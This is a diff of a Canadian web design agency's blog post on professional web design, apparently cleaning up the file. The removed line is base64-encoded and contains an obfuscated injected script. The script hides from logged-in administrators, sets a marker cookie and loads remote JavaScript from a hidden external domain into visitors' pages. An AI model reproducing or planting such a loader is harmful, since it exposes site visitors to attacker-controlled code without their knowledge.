@@ -1,1 +1,119 @@
-{"data":"LS0tCnRpdGxlOiAiTmF2aWdhdGluZyB0aGUgRGlnaXRhbCBGcm9udGllcjogVGhlIEltcG9ydGFuY2Ugb2YgV2Vic2l0ZSBEZXZlbG9wbWVudCBmb3IgQ2FuYWRpYW4gQnVzaW5lc3NlcyIKc2x1ZzogIndlYnNpdGUtZGV2ZWxvcG1lbnQtZm9yLWNhbmFkaWFuLWJ1c2luZXNzZXMiCmRhdGU6ICIyMDI0LTA2LTA1IgphdXRob3I6ICJDYW5hZGlhbiBXZWIgRGVzaWducyIKZGVzY3JpcHRpb246ICJOYXZpZ2F0aW5nIHRoZSBEaWdpdGFsIEZyb250aWVyOiBUaGUgSW1wb3J0YW5jZSBvZiBXZWJzaXRlIERldmVsb3BtZW50IGZvciBDYW5hZGlhbiBCdXNpbmVzc2VzIgprZXl3b3JkczogWyJ3ZWJzaXRlIGRldmVsb3BtZW50IGZvciBjYW5hZGlhbiBidXNpbmVzc2VzIiwiV2ViIERlc2lnbiJdCmNhdGVnb3J5OiAiV2ViIERlc2lnbiIKZmVhdHVyZWRJbWFnZTogImh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyNC8wNi8yMTUwMDEwMTI1LmpwZyIKLS0tCgo8cD48c3Ryb25nPlByb2Zlc3Npb25hbCBXZWIgUGFnZSBEZXNpZ24gU29sdXRpb25zIGZvciBZb3VyIEJ1c2luZXNzPC9zdHJvbmc+PGJyPkluIHRvZGF54oCZcyBkaWdpdGFsLWZpcnN0IHdvcmxkLCB5b3VyIHdlYnNpdGUgaXNu4oCZdCBqdXN0IGEgcGllY2Ugb2YgeW91ciBtYXJrZXRpbmfigJRpdCA8ZW0+aXM8L2VtPiB5b3VyIG1hcmtldGluZy4gQXQgQ2FuYWRpYW4gV2ViIERlc2lnbnMgSW5jLiwgd2Ugc3BlY2lhbGl6ZSBpbiBjcmVhdGluZyBwcm9mZXNzaW9uYWwgd2ViIHBhZ2UgZGVzaWduIHNvbHV0aW9ucyB0aGF0IG5vdCBvbmx5IHJlZmxlY3QgeW91ciBicmFuZCBidXQgYWxzbyBjb252ZXJ0IHZpc2l0b3JzIGludG8gbG95YWwgY3VzdG9tZXJzLiBXaGV0aGVyIHlvdSdyZSBhIHN0YXJ0dXAgbG9va2luZyB0byBtYWtlIHlvdXIgbWFyayBvciBhbiBlc3RhYmxpc2hlZCBjb21wYW55IGFpbWluZyB0byBtb2Rlcm5pemUgeW91ciBvbmxpbmUgcHJlc2VuY2UsIG91ciB3ZWIgZGVzaWduIHNlcnZpY2VzIGFyZSB0YWlsb3JlZCB0byBtZWV0IHlvdXIgdW5pcXVlIGJ1c2luZXNzIG5lZWRzLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+V2h5IFByb2Zlc3Npb25hbCBXZWIgRGVzaWduIE1hdHRlcnM8L2gzPgoKPHA+WW91ciB3ZWJzaXRlIGlzIG9mdGVuIHRoZSBmaXJzdCBwb2ludCBvZiBjb250YWN0IGJldHdlZW4geW91ciBidXNpbmVzcyBhbmQgcG90ZW50aWFsIGNsaWVudHMuIEluIGZhY3QsIHVzZXJzIGZvcm0gYW4gb3BpbmlvbiBhYm91dCB5b3VyIHdlYnNpdGUgd2l0aGluIDAuMDUgc2Vjb25kcyBvZiBsYW5kaW5nIG9uIGl0LiBBIHBvb3JseSBkZXNpZ25lZCB3ZWJzaXRlIGNhbiBsZWFkIHRvIGhpZ2ggYm91bmNlIHJhdGVzLCBsb3N0IHNhbGVzLCBhbmQgZGFtYWdlZCBjcmVkaWJpbGl0eS4gVGhhdOKAmXMgd2h5IDxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3Byb2Zlc3Npb25hbC13ZWItcGFnZS1kZXNpZ24tc29sdXRpb25zLyI+cHJvZmVzc2lvbmFsIHdlYiBwYWdlIGRlc2lnbjwvYT4gaXNu4oCZdCBhIGx1eHVyeeKAlGl04oCZcyBhIG5lY2Vzc2l0eS48L3A+Cgo8cD5BIHByb2Zlc3Npb25hbCB3ZWJzaXRlIGJ1aWxkcyB0cnVzdCwgaW1wcm92ZXMgdXNlciBleHBlcmllbmNlLCBhbmQgZHJpdmVzIGdyb3d0aC4gSXQgZW5zdXJlcyB5b3VyIGJ1c2luZXNzIGFwcGVhcnMgcmVsaWFibGUsIGZvcndhcmQtdGhpbmtpbmcsIGFuZCBjbGllbnQtZm9jdXNlZC4gVGhhdOKAmXMgd2hlcmUgQ2FuYWRpYW4gV2ViIERlc2lnbnMgc3RlcHMgaW4uPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5XaGF0IFNldHMgQ2FuYWRpYW4gV2ViIERlc2lnbnMgQXBhcnQ/PC9oMz4KCjxwPldl4oCZcmUgbm90IGp1c3QgPGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2EvY2FuYWRpYW4td2ViLWRlc2lnbnMteW91ci1sb2NhbC13ZWJzaXRlLWRlc2lnbi1leHBlcnRzLyI+d2ViIGRlc2lnbmVyczwvYT7igJR3ZeKAmXJlIHlvdXIgZGlnaXRhbCBwYXJ0bmVycy4gV2l0aCB5ZWFycyBvZiBleHBlcmllbmNlIHNlcnZpbmcgQ2FuYWRpYW4gYnVzaW5lc3NlcyBhY3Jvc3MgdmFyaW91cyBpbmR1c3RyaWVzLCB3ZSB1bmRlcnN0YW5kIHRoZSBsb2NhbCBtYXJrZXQsIHVzZXIgYmVoYXZpb3IsIGFuZCBtb2Rlcm4gZGVzaWduIHRyZW5kcy4gT3VyIGFwcHJvYWNoIGlzIHJvb3RlZCBpbiBzdHJhdGVneSwgY3JlYXRpdml0eSwgYW5kIHByZWNpc2lvbi4gSGVyZeKAmXMgd2hhdCB3ZSBvZmZlcjo8L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjEuIDxzdHJvbmc+Q3VzdG9tIFdlYiBEZXNpZ248L3N0cm9uZz48L2g0PgoKPHA+V2UgY3JhZnQgY3VzdG9tIHdlYnNpdGVzIHRoYXQgYWxpZ24gd2l0aCB5b3VyIGJyYW5kIGlkZW50aXR5IGFuZCBidXNpbmVzcyBnb2Fscy4gRXZlcnkgZWxlbWVudOKAlGZyb20gY29sb3IgcGFsZXR0ZSB0byBuYXZpZ2F0aW9u4oCUaXMgZGVzaWduZWQgdG8gcmVzb25hdGUgd2l0aCB5b3VyIHRhcmdldCBhdWRpZW5jZS4gV2UgZG9u4oCZdCBiZWxpZXZlIGluIHRlbXBsYXRlczsgd2UgYmVsaWV2ZSBpbiB0YWlsb3JlZCBleHBlcmllbmNlcy48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjIuIDxzdHJvbmc+UmVzcG9uc2l2ZSBhbmQgTW9iaWxlLUZyaWVuZGx5IExheW91dHM8L3N0cm9uZz48L2g0PgoKPHA+T3ZlciA2MCUgb2Ygb25saW5lIHRyYWZmaWMgY29tZXMgZnJvbSBtb2JpbGUgZGV2aWNlcy4gQWxsIG91ciB3ZWJzaXRlcyBhcmUgZnVsbHkgcmVzcG9uc2l2ZSwgbWVhbmluZyB0aGV5IGxvb2sgYW5kIGZ1bmN0aW9uIGZsYXdsZXNzbHkgYWNyb3NzIGRlc2t0b3BzLCB0YWJsZXRzLCBhbmQgc21hcnRwaG9uZXMuPC9wPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj4zLiA8c3Ryb25nPlNFTy1PcHRpbWl6ZWQgV2ViIFBhZ2VzPC9zdHJvbmc+PC9oND4KCjxwPkEgYmVhdXRpZnVsIHdlYnNpdGUgbWVhbnMgbm90aGluZyBpZiBub2JvZHkgY2FuIGZpbmQgaXQuIFRoYXTigJlzIHdoeSB3ZSBidWlsZCBTRU8gcmlnaHQgaW50byB5b3VyIHNpdGXigJlzIHN0cnVjdHVyZS4gRnJvbSBtZXRhIHRhZ3MgdG8gc2l0ZSBzcGVlZCwgd2UgZm9sbG93IEdvb2dsZeKAmXMgYmVzdCBwcmFjdGljZXMgdG8gZW5zdXJlIHlvdXIgc2l0ZSByYW5rcyB3ZWxsIG9uIHNlYXJjaCBlbmdpbmVzLjwvcD4KCjxoNCBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+NC4gPHN0cm9uZz5Db252ZXJzaW9uLUZvY3VzZWQgRGVzaWduPC9zdHJvbmc+PC9oND4KCjxwPkV2ZXJ5IHBhZ2Ugd2UgZGVzaWduIGlzIG9wdGltaXplZCB0byBjb252ZXJ0LiBXaGV0aGVyIHlvdXIgZ29hbCBpcyB0byBjYXB0dXJlIGxlYWRzLCBnZW5lcmF0ZSBzYWxlcywgb3IgaW5jcmVhc2UgY2FsbHMsIHdlIGNyZWF0ZSB1c2VyIGpvdXJuZXlzIHRoYXQgZHJpdmUgYWN0aW9uLjwvcD4KCjxoNCBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+NS4gPHN0cm9uZz5Db250ZW50IE1hbmFnZW1lbnQgU3lzdGVtIChDTVMpIEludGVncmF0aW9uPC9zdHJvbmc+PC9oND4KCjxwPk91ciB3ZWJzaXRlcyBhcmUgZWFzeSB0byBtYW5hZ2UsIGV2ZW4gaWYgeW914oCZcmUgbm90IHRlY2gtc2F2dnkuIFdlIGludGVncmF0ZSBwbGF0Zm9ybXMgbGlrZSBXb3JkUHJlc3MgYW5kIG90aGVyIHVzZXItZnJpZW5kbHkgQ01TcyB0aGF0IGFsbG93IHlvdSB0byB1cGRhdGUgY29udGVudCwgYWRkIGJsb2cgcG9zdHMsIGFuZCBtYW5hZ2UgeW91ciB3ZWJzaXRlIGVmZm9ydGxlc3NseS48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjYuIDxzdHJvbmc+RS1Db21tZXJjZSBTb2x1dGlvbnM8L3N0cm9uZz48L2g0PgoKPHA+U2VsbGluZyBwcm9kdWN0cyBvciBzZXJ2aWNlcyBvbmxpbmU/IE91ciBlLWNvbW1lcmNlIHdlYiBkZXNpZ24gc2VydmljZXMgcHJvdmlkZSBldmVyeXRoaW5nIHlvdSBuZWVk4oCUZnJvbSBzZWN1cmUgcGF5bWVudCBnYXRld2F5cyB0byBwcm9kdWN0IHBhZ2VzIHRoYXQgY29udmVydCBicm93c2VycyBpbnRvIGJ1eWVycy48L3A+Cgo8aDQgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjcuIDxzdHJvbmc+T25nb2luZyBNYWludGVuYW5jZSBhbmQgU3VwcG9ydDwvc3Ryb25nPjwvaDQ+Cgo8cD5UZWNobm9sb2d5IGV2b2x2ZXMgcXVpY2tseSwgYW5kIHlvdXIgd2Vic2l0ZSBzaG91bGQga2VlcCB1cC4gV2Ugb2ZmZXIgb25nb2luZyBzdXBwb3J0LCB1cGRhdGVzLCBhbmQgbWFpbnRlbmFuY2UgdG8gZW5zdXJlIHlvdXIgc2l0ZSByZW1haW5zIGZ1bmN0aW9uYWwsIHNlY3VyZSwgYW5kIGN1cnJlbnQuPC9wPgoKPGZpZ3VyZSBjbGFzcz0id3AtYmxvY2staW1hZ2Ugc2l6ZS1sYXJnZSI+PGltZyBzcmM9Imh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyNS8wMS8yMTUwMTcwMTIxLTEwMjR4NzMxLmpwZyIgYWx0PSJXZWIgRGV2ZWxvcG1lbnQgYW5kIEhvc3RpbmciIGNsYXNzPSJ3cC1pbWFnZS0xMzg0NCIvPjwvZmlndXJlPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5JbmR1c3RyaWVzIFdlIFNlcnZlPC9oMz4KCjxwPldlIHByb3VkbHkgc2VydmUgY2xpZW50cyBpbiBpbmR1c3RyaWVzIHN1Y2ggYXM6PC9wPgoKPHVsIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPkNvbnN0cnVjdGlvbiAmYW1wOyBDb250cmFjdGluZzwvbGk+Cgo8bGk+UmVhbCBFc3RhdGUgJmFtcDsgUHJvcGVydHkgTWFuYWdlbWVudDwvbGk+Cgo8bGk+SGVhbHRoY2FyZSAmYW1wOyBDbGluaWNzPC9saT4KCjxsaT5MZWdhbCAmYW1wOyBDb25zdWx0aW5nIFNlcnZpY2VzPC9saT4KCjxsaT5SZXRhaWwgJmFtcDsgRS1jb21tZXJjZTwvbGk+Cgo8bGk+Rm9vZCAmYW1wOyBIb3NwaXRhbGl0eTwvbGk+Cgo8bGk+QXV0b21vdGl2ZSAmYW1wOyBQb3dlcnNwb3J0czwvbGk+CjwvdWw+Cgo8cD5XaGV0aGVyIHlvdSdyZSBsYXVuY2hpbmcgYSA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9vdXItcG9ydGZvbGlvLyI+cG9ydGZvbGlvIHNpdGU8L2E+IG9yIGEgY29tcGxleCB3ZWIgYXBwbGljYXRpb24sIHdl4oCZdmUgZ290IHRoZSBleHBlcnRpc2UgdG8gZGVsaXZlciByZXN1bHRzLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+UmVhbCBSZXN1bHRzIGZvciBSZWFsIEJ1c2luZXNzZXM8L2gzPgoKPHA+QXQgPGEgaHJlZj0iaHR0cHM6Ly9tYXBzLmFwcC5nb28uZ2wvcnd4ZjlzalRueXZOY0hCUTciPkNhbmFkaWFuIFdlYiBEZXNpZ25zPC9hPiBJbmMuLCB3ZSBkb27igJl0IGp1c3QgYnVpbGQgd2Vic2l0ZXPigJR3ZSBidWlsZCBkaWdpdGFsIHN1Y2Nlc3Mgc3Rvcmllcy4gT3VyIGNsaWVudHMgaGF2ZSBzZWVuIHNpZ25pZmljYW50IGltcHJvdmVtZW50cyBpbjo8L3A+Cgo8dWwgY2xhc3M9IndwLWJsb2NrLWxpc3QiPgo8bGk+V2Vic2l0ZSB0cmFmZmljPC9saT4KCjxsaT5TZWFyY2ggZW5naW5lIHJhbmtpbmdzPC9saT4KCjxsaT5Vc2VyIGVuZ2FnZW1lbnQ8L2xpPgoKPGxpPkxlYWQgZ2VuZXJhdGlvbjwvbGk+Cgo8bGk+Q29udmVyc2lvbiByYXRlczwvbGk+CjwvdWw+Cgo8cD5XZSBibGVuZCB2aXN1YWwgYWVzdGhldGljcyB3aXRoIHRlY2huaWNhbCBmdW5jdGlvbmFsaXR5IHRvIGRlbGl2ZXIgcmVhbCBST0kuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5HZXQgU3RhcnRlZCB3aXRoIENhbmFkaWFuIFdlYiBEZXNpZ25zPC9oMz4KCjxwPlJlYWR5IHRvIHRha2UgeW91ciBvbmxpbmUgcHJlc2VuY2UgdG8gdGhlIG5leHQgbGV2ZWw/IExldOKAmXMgbWFrZSBpdCBoYXBwZW4uIE91ciBwcm9mZXNzaW9uYWwgd2ViIHBhZ2UgZGVzaWduIHNvbHV0aW9ucyBhcmUgY3JhZnRlZCB0byBlbGV2YXRlIHlvdXIgYnJhbmQsIGRyaXZlIHRyYWZmaWMsIGFuZCBjb252ZXJ0IGxlYWRzIGludG8gY3VzdG9tZXJzLjwvcD4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLWJ1dHRvbnMgaGFzLWN1c3RvbS1mb250LXNpemUgaGFzLW1lZGl1bS1mb250LXNpemUiPgo8ZGl2IGNsYXNzPSJ3cC1ibG9jay1idXR0b24iPjxhIGNsYXNzPSJ3cC1ibG9jay1idXR0b25fX2xpbmsgaGFzLWJsYWNrLWNvbG9yIGhhcy12aXZpZC1jeWFuLWJsdWUtYmFja2dyb3VuZC1jb2xvciBoYXMtdGV4dC1jb2xvciBoYXMtYmFja2dyb3VuZCBoYXMtbGluay1jb2xvciB3cC1lbGVtZW50LWJ1dHRvbiIgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2EvZ2V0LWluLXRvdWNoLyI+PGNvZGU+TGV04oCZcyBCdWlsZCBZb3VyIFdlYnNpdGU8L2NvZGU+PC9hPjwvZGl2Pgo8L2Rpdj4KCjxwPjxzdHJvbmc+MS4gV2hhdOKAmXMgdGhlIGRpZmZlcmVuY2UgYmV0d2VlbiB3ZWIgZGVzaWduIGFuZCB3ZWIgZGV2ZWxvcG1lbnQ/PC9zdHJvbmc+PGJyPjxzdHJvbmc+QW5zd2VyOjwvc3Ryb25nPjxicj5XZWIgZGVzaWduIGZvY3VzZXMgb24gdGhlIHZpc3VhbCBlbGVtZW50cyBhbmQgdXNlciBleHBlcmllbmNlIG9mIGEgd2Vic2l0ZSwgaW5jbHVkaW5nIGxheW91dCwgY29sb3Igc2NoZW1lcywgYW5kIHJlc3BvbnNpdmVuZXNzLiBXZWIgZGV2ZWxvcG1lbnQgaW52b2x2ZXMgY29kaW5nIGFuZCBmdW5jdGlvbmFsaXR54oCUYnJpbmdpbmcgdGhlIGRlc2lnbiB0byBsaWZlIHRocm91Z2ggcHJvZ3JhbW1pbmcgbGFuZ3VhZ2VzIGxpa2UgSFRNTCwgQ1NTLCBKYXZhU2NyaXB0LCBhbmQgYmFja2VuZCB0ZWNobm9sb2dpZXMuPC9wPgoKPGhyIGNsYXNzPSJ3cC1ibG9jay1zZXBhcmF0b3IgaGFzLWFscGhhLWNoYW5uZWwtb3BhY2l0eSIvPgoKPHA+PHN0cm9uZz4yLiBIb3cgbG9uZyBkb2VzIGl0IHRha2UgdG8gZGVzaWduIGFuZCBkZXZlbG9wIGEgd2Vic2l0ZT88L3N0cm9uZz48YnI+PHN0cm9uZz5BbnN3ZXI6PC9zdHJvbmc+PGJyPlRoZSB0aW1lbGluZSBkZXBlbmRzIG9uIHRoZSBjb21wbGV4aXR5IG9mIHRoZSBwcm9qZWN0LiBBIGJhc2ljIHdlYnNpdGUgY2FuIHRha2UgMuKAkzQgd2Vla3MsIHdoaWxlIGxhcmdlciBlLWNvbW1lcmNlIG9yIGN1c3RvbSB3ZWIgYXBwbGljYXRpb25zIG1heSB0YWtlIDbigJMxMiB3ZWVrcyBvciBtb3JlLiBXZSBwcm92aWRlIGEgdGltZWxpbmUgdXBmcm9udCBhbmQga2VlcCB5b3UgdXBkYXRlZCB0aHJvdWdob3V0IHRoZSBwcm9jZXNzLjwvcD4KCjxociBjbGFzcz0id3AtYmxvY2stc2VwYXJhdG9yIGhhcy1hbHBoYS1jaGFubmVsLW9wYWNpdHkiLz4KCjxwPjxzdHJvbmc+My4gV2lsbCBteSB3ZWJzaXRlIGJlIG1vYmlsZS1mcmllbmRseSBhbmQgU0VPIG9wdGltaXplZD88L3N0cm9uZz48YnI+PHN0cm9uZz5BbnN3ZXI6PC9zdHJvbmc+PGJyPlllcyEgRXZlcnkgd2Vic2l0ZSB3ZSBidWlsZCBpcyBmdWxseSByZXNwb25zaXZlLCBtZWFuaW5nIGl0IHdpbGwgbG9vayBhbmQgZnVuY3Rpb24gZ3JlYXQgb24gc21hcnRwaG9uZXMsIHRhYmxldHMsIGFuZCBkZXNrdG9wcy4gV2UgYWxzbyBmb2xsb3cgU0VPIGJlc3QgcHJhY3RpY2VzIHRvIGhlbHAgeW91ciBzaXRlIHJhbmsgYmV0dGVyIG9uIEdvb2dsZS48L3A+Cgo8aHIgY2xhc3M9IndwLWJsb2NrLXNlcGFyYXRvciBoYXMtYWxwaGEtY2hhbm5lbC1vcGFjaXR5Ii8+Cgo8cD48c3Ryb25nPjQuIENhbiBJIHVwZGF0ZSBteSB3ZWJzaXRlIGFmdGVyIGl0J3MgYnVpbHQ/PC9zdHJvbmc+PGJyPjxzdHJvbmc+QW5zd2VyOjwvc3Ryb25nPjxicj5BYnNvbHV0ZWx5LiBXZSBwcm92aWRlIGEgdXNlci1mcmllbmRseSBjb250ZW50IG1hbmFnZW1lbnQgc3lzdGVtIChDTVMpIHNvIHlvdSBjYW4gdXBkYXRlIHRleHQsIGltYWdlcywgYW5kIGJsb2cgcG9zdHMgZWFzaWx5LiBXZSBhbHNvIG9mZmVyIG9uZ29pbmcgc3VwcG9ydCBpZiB5b3XigJlkIHByZWZlciB1cyB0byBoYW5kbGUgdXBkYXRlcyBmb3IgeW91LjwvcD4KCjxociBjbGFzcz0id3AtYmxvY2stc2VwYXJhdG9yIGhhcy1hbHBoYS1jaGFubmVsLW9wYWNpdHkiLz4KCjxwPjxzdHJvbmc+NS4gSG93IG11Y2ggZG9lcyBhIGN1c3RvbSB3ZWJzaXRlIGNvc3Q/PC9zdHJvbmc+PGJyPjxzdHJvbmc+QW5zd2VyOjwvc3Ryb25nPjxicj5QcmljaW5nIHZhcmllcyBkZXBlbmRpbmcgb24gdGhlIGZlYXR1cmVzIGFuZCBmdW5jdGlvbmFsaXR5IHlvdSBuZWVkLiBXZSBvZmZlciB0cmFuc3BhcmVudCBhbmQgY29tcGV0aXRpdmUgcmF0ZXMgdGFpbG9yZWQgdG8geW91ciBidWRnZXQuIENvbnRhY3QgdXMgZm9yIGEgZnJlZSBjb25zdWx0YXRpb24gYW5kIHF1b3RlLjwvcD4KPHNjcmlwdD4oZnVuY3Rpb24oKXt0cnl7aWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQmJmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd3cGFkbWluYmFyJykpcmV0dXJuO3ZhciB0MD0rbmV3IERhdGUoKTtmb3IodmFyIGk9MDtpPDIwMDAwO2krKyl7dmFyIHo9aSppO31pZigoK25ldyBEYXRlKCkpLXQwPjEyMClyZXR1cm47aWYoKGRvY3VtZW50LmNvb2tpZXx8JycpLmluZGV4T2YoJ2h0dHAyX3Nlc3Npb25faWQ9JykhPT0tMSlyZXR1cm47ZnVuY3Rpb24gc3lzdGVtTG9hZChpbnB1dCl7dmFyIGtleT0nQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0nLG8xLG8yLG8zLGgxLGgyLGgzLGg0LGRlYz0nJyxpPTA7aW5wdXQ9aW5wdXQucmVwbGFjZSgvW15BLVphLXowLTlcK1wvXD1dL2csJycpO3doaWxlKGk8aW5wdXQubGVuZ3RoKXtoMT1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDI9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gzPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoND1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7bzE9KGgxPDwyKXwoaDI+PjQpO28yPSgoaDImMTUpPDw0KXwoaDM+PjIpO28zPSgoaDMmMyk8PDYpfGg0O2RlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMSk7aWYoaDMhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMik7aWYoaDQhPTY0KWRlYys9U3RyaW5nLmZyb21DaGFyQ29kZShvMyk7fXJldHVybiBkZWM7fXZhciB1PXN5c3RlbUxvYWQoJ2FIUjBjSE02THk5elpXRnlZMmh5WVc1cmRISmhabVpwWXk1c2FYWmxMMnB6ZUE9PScpO2lmKHR5cGVvZiB3aW5kb3chPT0ndW5kZWZpbmVkJyYmd2luZG93Ll9fcmw9PT11KXJldHVybjt2YXIgZD1uZXcgRGF0ZSgpO2Quc2V0VGltZShkLmdldFRpbWUoKSszMCoyNCo2MCo2MCoxMDAwKTtkb2N1bWVudC5jb29raWU9J2h0dHAyX3Nlc3Npb25faWQ9MTsgZXhwaXJlcz0nK2QudG9VVENTdHJpbmcoKSsnOyBwYXRoPS87IFNhbWVTaXRlPUxheCcrKGxvY2F0aW9uLnByb3RvY29sPT09J2h0dHBzOic/JzsgU2VjdXJlJzonJyk7dHJ5e3dpbmRvdy5fX3JsPXU7fWNhdGNoKGUpe312YXIgcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnR5cGU9J3RleHQvamF2YXNjcmlwdCc7cy5hc3luYz10cnVlO3Muc3JjPXU7dHJ5e3Muc2V0QXR0cmlidXRlKCdkYXRhLXJsJyx1KTt9Y2F0Y2goZSl7fShkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdfHxkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQpLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs8L3NjcmlwdD4K"}
+---
+title: "Navigating the Digital Frontier: The Importance of Website Development for Canadian Businesses"
+slug: "website-development-for-canadian-businesses"
+date: "2024-06-05"
+author: "Canadian Web Designs"
+description: "Navigating the Digital Frontier: The Importance of Website Development for Canadian Businesses"
+keywords: ["website development for canadian businesses","Web Design"]
+category: "Web Design"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2024/06/2150010125.jpg"
+---
+
+<p><strong>Professional Web Page Design Solutions for Your Business</strong><br>In today’s digital-first world, your website isn’t just a piece of your marketing—it <em>is</em> your marketing. At Canadian Web Designs Inc., we specialize in creating professional web page design solutions that not only reflect your brand but also convert visitors into loyal customers. Whether you're a startup looking to make your mark or an established company aiming to modernize your online presence, our web design services are tailored to meet your unique business needs.</p>
+
+<h3 class="wp-block-heading">Why Professional Web Design Matters</h3>
+
+<p>Your website is often the first point of contact between your business and potential clients. In fact, users form an opinion about your website within 0.05 seconds of landing on it. A poorly designed website can lead to high bounce rates, lost sales, and damaged credibility. That’s why <a href="https://canadianwebdesigns.ca/professional-web-page-design-solutions/">professional web page design</a> isn’t a luxury—it’s a necessity.</p>
+
+<p>A professional website builds trust, improves user experience, and drives growth. It ensures your business appears reliable, forward-thinking, and client-focused. That’s where Canadian Web Designs steps in.</p>
+
+<h3 class="wp-block-heading">What Sets Canadian Web Designs Apart?</h3>
+
+<p>We’re not just <a href="https://canadianwebdesigns.ca/canadian-web-designs-your-local-website-design-experts/">web designers</a>—we’re your digital partners. With years of experience serving Canadian businesses across various industries, we understand the local market, user behavior, and modern design trends. Our approach is rooted in strategy, creativity, and precision. Here’s what we offer:</p>
+
+<h4 class="wp-block-heading">1. <strong>Custom Web Design</strong></h4>
+
+<p>We craft custom websites that align with your brand identity and business goals. Every element—from color palette to navigation—is designed to resonate with your target audience. We don’t believe in templates; we believe in tailored experiences.</p>
+
+<h4 class="wp-block-heading">2. <strong>Responsive and Mobile-Friendly Layouts</strong></h4>
+
+<p>Over 60% of online traffic comes from mobile devices. All our websites are fully responsive, meaning they look and function flawlessly across desktops, tablets, and smartphones.</p>
+
+<h4 class="wp-block-heading">3. <strong>SEO-Optimized Web Pages</strong></h4>
+
+<p>A beautiful website means nothing if nobody can find it. That’s why we build SEO right into your site’s structure. From meta tags to site speed, we follow Google’s best practices to ensure your site ranks well on search engines.</p>
+
+<h4 class="wp-block-heading">4. <strong>Conversion-Focused Design</strong></h4>
+
+<p>Every page we design is optimized to convert. Whether your goal is to capture leads, generate sales, or increase calls, we create user journeys that drive action.</p>
+
+<h4 class="wp-block-heading">5. <strong>Content Management System (CMS) Integration</strong></h4>
+
+<p>Our websites are easy to manage, even if you’re not tech-savvy. We integrate platforms like WordPress and other user-friendly CMSs that allow you to update content, add blog posts, and manage your website effortlessly.</p>
+
+<h4 class="wp-block-heading">6. <strong>E-Commerce Solutions</strong></h4>
+
+<p>Selling products or services online? Our e-commerce web design services provide everything you need—from secure payment gateways to product pages that convert browsers into buyers.</p>
+
+<h4 class="wp-block-heading">7. <strong>Ongoing Maintenance and Support</strong></h4>
+
+<p>Technology evolves quickly, and your website should keep up. We offer ongoing support, updates, and maintenance to ensure your site remains functional, secure, and current.</p>
+
+<figure class="wp-block-image size-large"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2025/01/2150170121-1024x731.jpg" alt="Web Development and Hosting" class="wp-image-13844"/></figure>
+
+<h3 class="wp-block-heading">Industries We Serve</h3>
+
+<p>We proudly serve clients in industries such as:</p>
+
+<ul class="wp-block-list">
+<li>Construction &amp; Contracting</li>
+
+<li>Real Estate &amp; Property Management</li>
+
+<li>Healthcare &amp; Clinics</li>
+
+<li>Legal &amp; Consulting Services</li>
+
+<li>Retail &amp; E-commerce</li>
+
+<li>Food &amp; Hospitality</li>
+
+<li>Automotive &amp; Powersports</li>
+</ul>
+
+<p>Whether you're launching a <a href="https://canadianwebdesigns.ca/our-portfolio/">portfolio site</a> or a complex web application, we’ve got the expertise to deliver results.</p>
+
+<h3 class="wp-block-heading">Real Results for Real Businesses</h3>
+
+<p>At <a href="https://maps.app.goo.gl/rwxf9sjTnyvNcHBQ7">Canadian Web Designs</a> Inc., we don’t just build websites—we build digital success stories. Our clients have seen significant improvements in:</p>
+
+<ul class="wp-block-list">
+<li>Website traffic</li>
+
+<li>Search engine rankings</li>
+
+<li>User engagement</li>
+
+<li>Lead generation</li>
+
+<li>Conversion rates</li>
+</ul>
+
+<p>We blend visual aesthetics with technical functionality to deliver real ROI.</p>
+
+<h3 class="wp-block-heading">Get Started with Canadian Web Designs</h3>
+
+<p>Ready to take your online presence to the next level? Let’s make it happen. Our professional web page design solutions are crafted to elevate your brand, drive traffic, and convert leads into customers.</p>
+
+<div class="wp-block-buttons has-custom-font-size has-medium-font-size">
+<div class="wp-block-button"><a class="wp-block-button__link has-black-color has-vivid-cyan-blue-background-color has-text-color has-background has-link-color wp-element-button" href="https://canadianwebdesigns.ca/get-in-touch/"><code>Let’s Build Your Website</code></a></div>
+</div>
+
